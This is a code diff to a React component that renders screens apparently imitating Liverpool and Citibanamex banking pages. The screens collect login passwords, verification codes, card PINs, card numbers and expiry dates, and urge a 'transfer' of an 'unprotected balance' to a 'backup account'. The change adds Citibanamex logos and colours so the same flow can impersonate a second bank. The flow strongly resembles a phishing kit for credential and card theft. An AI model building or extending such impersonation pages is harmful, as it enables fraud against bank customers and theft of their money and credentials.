@@ -1,9 +1,10 @@
-import React, { useState } from 'react';
+import React, { useState, useContext } from 'react';
 import { Card } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { ScreenType } from '@shared/schema';
-import liverpoolLogo from '@assets/pngwing.com 2.png';
+import liverpoolLogo from '../../assets/pngwing.com 2.png';
+import citibanamexLogo from '../../assets/Citibanamex_Logo.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -17,12 +18,14 @@ interface ScreenTemplatesProps {
     mensaje?: string;
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
+  banco?: string;
 }
 
 export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
   currentScreen, 
   screenData,
-  onSubmit
+  onSubmit,
+  banco = "LIVERPOOL"
 }) => {
   // Form state
   const [folioInput, setFolioInput] = useState('');
@@ -49,7 +52,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               onChange={(e) => setFolioInput(e.target.value)}
             />
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
             >
               Ingresar
@@ -77,7 +80,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               onChange={(e) => setLoginInputs(prev => ({ ...prev, password: e.target.value }))}
             />
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.LOGIN, loginInputs)}
             >
               Ingresar
@@ -100,7 +103,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               onChange={(e) => setCodigoInput(e.target.value)}
             />
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}
             >
               Continuar
@@ -122,7 +125,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               onChange={(e) => setNipInput(e.target.value)}
             />
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}
             >
               Continuar
@@ -140,7 +143,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               Saldo sin proteger: <strong>{screenData.saldo || "$39,499,494"}</strong>
             </div>
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.PROTEGER, { proteger: true })}
             >
               Continuar
@@ -161,7 +164,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <p><strong>Alias:</strong> Cuenta de respaldo.</p>
             </div>
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.TRANSFERIR, { transferencia: true })}
             >
               Confirmar transferencia
@@ -222,7 +225,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
             
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors w-full"
+              className={`${primaryBtnClass} w-full`}
               onClick={() => onSubmit(ScreenType.TARJETA, { 
                 tarjeta: tarjetaInput,
                 fechaVencimiento: fechaVencimientoInput,
@@ -250,7 +253,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
             <p className="mb-4">El monto estará disponible en su tarjeta dentro de 72 horas.</p>
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.CANCELACION, { finalizado: true })}
             >
               Finalizar
@@ -266,7 +269,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <p>{screenData.mensaje || "Mensaje personalizado del banco."}</p>
             </div>
             <Button 
-              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
             >
               Entendido
@@ -280,7 +283,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <h2 className="text-xl font-bold mb-4">Validando...</h2>
             <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
             <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
-              <div className="h-full bg-[#e10098] animate-progress-bar"></div>
+              <div className={`h-full ${banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 'bg-[#e10098]'} animate-progress-bar`}></div>
             </div>
             <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
           </div>
@@ -296,12 +299,21 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     }
   };
 
-  // Logo de Liverpool que se mostrará en todas las pantallas
+  // Logo del banco que se mostrará en todas las pantallas
   const renderLogo = () => (
     <div className="flex justify-center mb-6">
-      <img src={liverpoolLogo} alt="Liverpool" className="h-20" />
+      <img 
+        src={banco === 'CITIBANAMEX' ? citibanamexLogo : liverpoolLogo} 
+        alt={banco === 'CITIBANAMEX' ? 'Citibanamex' : 'Liverpool'} 
+        className="h-20" 
+      />
     </div>
   );
+
+  // Definimos las clases de estilos para los botones según el banco
+  const primaryBtnClass = banco === 'CITIBANAMEX' 
+    ? "bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors" 
+    : "bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors";
 
   return (
     <>
